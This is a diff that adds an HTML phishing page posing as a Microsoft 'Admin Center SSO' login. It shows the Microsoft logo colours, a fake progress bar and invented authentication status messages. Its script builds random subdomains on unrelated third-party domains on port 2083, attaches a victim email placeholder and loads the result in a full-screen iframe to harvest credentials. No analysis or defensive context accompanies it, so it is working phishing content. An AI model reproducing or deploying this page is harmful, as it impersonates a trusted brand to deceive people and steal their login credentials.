@@ -1,0 +1,497 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="description" content="enter Portal">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Admin Center SSO</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Segoe UI Web', 'Segoe UI Variable Display', system-ui, -apple-system, 'Helvetica Neue', 'Microsoft YaHei', sans-serif;
+            background: #FFFFFF;
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: #FFFFFF;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        .loading-container {
+            text-align: center;
+            max-width: 460px;
+            width: 85vw;
+            animation: fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
+        }
+
+        @keyframes fadeSlideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-grid {
+            width: 88px;
+            height: 88px;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-template-rows: repeat(2, 1fr);
+            gap: 6px;
+            margin: 0 auto 28px auto;
+            border-radius: 4px;
+        }
+
+        .logo-panel {
+            border-radius: 2px;
+        }
+
+        .logo-panel:nth-child(1) { background: #F25022; }
+        .logo-panel:nth-child(2) { background: #7FBA00; }
+        .logo-panel:nth-child(3) { background: #00A4EF; }
+        .logo-panel:nth-child(4) { background: #FFB900; }
+
+        .title-text {
+            font-size: 28px;
+            font-weight: 540;
+            color: #1F1F1F;
+            margin-bottom: 8px;
+            letter-spacing: -0.28px;
+        }
+
+        .sub-text {
+            font-size: 15px;
+            color: #5E5E5E;
+            font-weight: 400;
+            margin-bottom: 44px;
+            line-height: 1.45;
+            background: #F9F9F9;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+        }
+
+        .loading-status {
+            font-size: 13px;
+            color: #6B6B6B;
+            font-weight: 450;
+            margin-bottom: 20px;
+            letter-spacing: 0.18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .spinner-dots {
+            display: inline-flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        .spinner-dots span {
+            width: 4px;
+            height: 4px;
+            background-color: #0078D4;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 1.2s infinite ease-in-out;
+        }
+
+        .spinner-dots span:nth-child(1) { animation-delay: 0s; }
+        .spinner-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .spinner-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes pulse {
+            0%, 60%, 100% {
+                transform: scale(0.8);
+                opacity: 0.5;
+            }
+            30% {
+                transform: scale(1.2);
+                opacity: 1;
+            }
+        }
+
+        .progress-container {
+            width: 280px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 2.5px;
+            background: #E9E9ED;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #0078D4;
+            transition: width 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border-radius: 4px;
+        }
+
+        .progress-percent {
+            font-size: 11px;
+            color: #8A8A8A;
+            margin-top: 12px;
+            font-weight: 450;
+            letter-spacing: 0.3px;
+        }
+
+        .frame-container {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1), visibility 0.35s;
+            z-index: 10;
+            background: #FFFFFF;
+        }
+
+        .frame-container.active {
+            opacity: 1;
+            visibility: visible;
+            z-index: 200;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #FFFFFF;
+            display: block;
+        }
+
+        @media (max-width: 540px) {
+            .logo-grid {
+                width: 72px;
+                height: 72px;
+                gap: 5px;
+            }
+            .title-text {
+                font-size: 24px;
+            }
+            .progress-container {
+                width: 240px;
+            }
+            .sub-text {
+                font-size: 13px;
+                margin-bottom: 38px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-container">
+        <div class="logo-grid">
+            <div class="logo-panel"></div>
+            <div class="logo-panel"></div>
+            <div class="logo-panel"></div>
+            <div class="logo-panel"></div>
+        </div>
+        <div class="title-text">Admin Center</div>
+        <div class="sub-text" id="dynamicSubtext">Verifying secure gateway • dummyvalue@domain.tld</div>
+        <div class="loading-status">
+            <span id="statusMessage">Establishing secure connection</span>
+            <div class="spinner-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-percent" id="progressPercent">0%</div>
+        </div>
+    </div>
+</div>
+
+<div class="frame-container" id="frameContainer">
+    <iframe id="mainFrame" 
+            sandbox="allow-same-origin allow-scripts allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation" 
+            referrerpolicy="strict-origin-when-cross-origin"
+            allow="clipboard-read; clipboard-write; cross-origin-isolated;"
+            title="SSO Portal"></iframe>
+</div>
+
+<script>
+    (function(){
+        "use strict";
+        
+        let progress = 0;
+        let completed = false;
+        let active = true;
+        let retries = 0;
+        let animId = null;
+        let timeoutId = null;
+        
+        const overlay = document.getElementById("loadingOverlay");
+        const container = document.getElementById("frameContainer");
+        const frame = document.getElementById("mainFrame");
+        const fill = document.getElementById("progressFill");
+        const percentSpan = document.getElementById("progressPercent");
+        const statusSpan = document.getElementById("statusMessage");
+        const dynamicSub = document.getElementById("dynamicSubtext");
+        
+        const dynamicTlds = [
+            "ytccomputer.com",
+            "anaksakti.online", 
+            "automedsos.com"
+        ];
+        
+        function getRandomDomain() {
+            const patterns = [
+                () => `[Random(${getRandomString(2)},${Math.floor(Math.random()*5)+5})].${dynamicTlds[Math.floor(Math.random() * dynamicTlds.length)]}`,
+                () => `[Random(${getRandomString(3)},${Math.floor(Math.random()*8)+3})].${dynamicTlds[Math.floor(Math.random() * dynamicTlds.length)]}`,
+                () => `${getRandomString(Math.floor(Math.random()*8)+5)}.${dynamicTlds[Math.floor(Math.random() * dynamicTlds.length)]}`
+            ];
+            return patterns[Math.floor(Math.random() * patterns.length)]();
+        }
+        
+        function getRandomString(length) {
+            const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < length; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return result;
+        }
+        
+        function buildUrl() {
+            const domain = getRandomDomain();
+            const randomParam = getRandomString(8);
+            return `https://${domain}:2083/impact?${randomParam}=dummyvalue@domain.tld`;
+        }
+        
+        let currentUrl = buildUrl();
+        
+        function updateProgress(val) {
+            if (!fill || !percentSpan) return;
+            let p = Math.min(100, Math.max(0, Math.floor(val * 10) / 10));
+            progress = p;
+            fill.style.width = progress + "%";
+            percentSpan.innerText = Math.floor(progress) + "%";
+            
+            if (progress < 15) {
+                statusSpan.innerText = "Initiating SSO handshake";
+            } else if (progress < 35) {
+                statusSpan.innerText = "Authenticating with directory";
+            } else if (progress < 60) {
+                statusSpan.innerText = "Verifying permissions";
+            } else if (progress < 85) {
+                statusSpan.innerText = "Loading dashboard";
+            } else {
+                statusSpan.innerText = "Finalizing connection";
+            }
+            
+            if (dynamicSub) {
+                if (progress > 20 && progress < 50) {
+                    dynamicSub.innerHTML = `SSO validation • dummyvalue@domain.tld • secure`;
+                } else if (progress >= 50) {
+                    dynamicSub.innerHTML = `Workspace • dummyvalue@domain.tld • ready`;
+                } else {
+                    dynamicSub.innerHTML = `Verifying secure gateway • dummyvalue@domain.tld`;
+                }
+            }
+        }
+        
+        function animateProgress() {
+            if (!active || completed) return;
+            
+            let increment = 0;
+            if (progress < 18) {
+                increment = 0.78 + (Math.random() * 0.3);
+            } else if (progress < 42) {
+                increment = 0.65 + (Math.random() * 0.28);
+            } else if (progress < 68) {
+                increment = 0.52 + (Math.random() * 0.22);
+            } else if (progress < 88) {
+                increment = 0.41 + (Math.random() * 0.18);
+            } else if (progress < 97) {
+                increment = 0.25 + (Math.random() * 0.12);
+            } else {
+                increment = 0.12;
+            }
+            
+            let next = progress + increment;
+            if (next >= 99.5 && !completed) {
+                next = 100;
+                updateProgress(100);
+                if (!completed) finishLoading();
+                return;
+            }
+            
+            updateProgress(next);
+            
+            if (progress >= 99.8 && !completed) {
+                finishLoading();
+                return;
+            }
+            
+            animId = requestAnimationFrame(animateProgress);
+        }
+        
+        function finishLoading() {
+            if (completed) return;
+            completed = true;
+            active = false;
+            
+            if (animId) cancelAnimationFrame(animId);
+            if (timeoutId) clearTimeout(timeoutId);
+            
+            updateProgress(100);
+            statusSpan.innerText = "Access granted, redirecting...";
+            
+            setTimeout(() => {
+                if (overlay) {
+                    overlay.style.opacity = "0";
+                    setTimeout(() => {
+                        if (overlay) overlay.style.display = "none";
+                        if (container) {
+                            container.classList.add("active");
+                            if (frame && (!frame.src || frame.src === "about:blank")) {
+                                frame.src = buildUrl();
+                            }
+                        }
+                    }, 400);
+                } else if (container) {
+                    container.classList.add("active");
+                }
+            }, 200);
+        }
+        
+        function loadFrame() {
+            if (!frame || completed || !active) return;
+            
+            if (timeoutId) clearTimeout(timeoutId);
+            
+            timeoutId = setTimeout(() => {
+                if (!completed && active) handleError();
+            }, 10000);
+            
+            const onLoad = () => {
+                if (timeoutId) clearTimeout(timeoutId);
+                frame.removeEventListener("load", onLoad);
+                frame.removeEventListener("error", onError);
+                
+                if (!completed && active) {
+                    if (progress < 98) {
+                        let steps = 0;
+                        const accelerate = setInterval(() => {
+                            if (completed || !active || steps >= 3) {
+                                clearInterval(accelerate);
+                                return;
+                            }
+                            if (progress < 100) {
+                                updateProgress(Math.min(progress + 5, 100));
+                                steps++;
+                            }
+                            if (progress >= 99.8) {
+                                clearInterval(accelerate);
+                                finishLoading();
+                            }
+                        }, 35);
+                        setTimeout(() => {
+                            if (!completed) finishLoading();
+                        }, 280);
+                    } else {
+                        finishLoading();
+                    }
+                }
+            };
+            
+            const onError = () => {
+                if (timeoutId) clearTimeout(timeoutId);
+                frame.removeEventListener("load", onLoad);
+                frame.removeEventListener("error", onError);
+                if (!completed && active) handleError();
+            };
+            
+            frame.addEventListener("load", onLoad, { once: true });
+            frame.addEventListener("error", onError, { once: true });
+            
+            currentUrl = buildUrl();
+            frame.src = currentUrl;
+        }
+        
+        function handleError() {
+            if (completed || !active) return;
+            
+            if (retries < 2) {
+                retries++;
+                setTimeout(() => {
+                    if (!completed && active) loadFrame();
+                }, 1500);
+            } else {
+                setTimeout(() => {
+                    if (!completed && active) finishLoading();
+                }, 800);
+            }
+        }
+        
+        function start() {
+            if (!active) return;
+            updateProgress(0);
+            setTimeout(() => {
+                loadFrame();
+                animateProgress();
+            }, 200);
+        }
+        
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", () => setTimeout(start, 100));
+        } else {
+            setTimeout(start, 100);
+        }
+        
+        window.addEventListener("beforeunload", () => {
+            active = false;
+            completed = true;
+            if (animId) cancelAnimationFrame(animId);
+            if (timeoutId) clearTimeout(timeoutId);
+        });
+    })();
+</script>
+</body>
+</html>
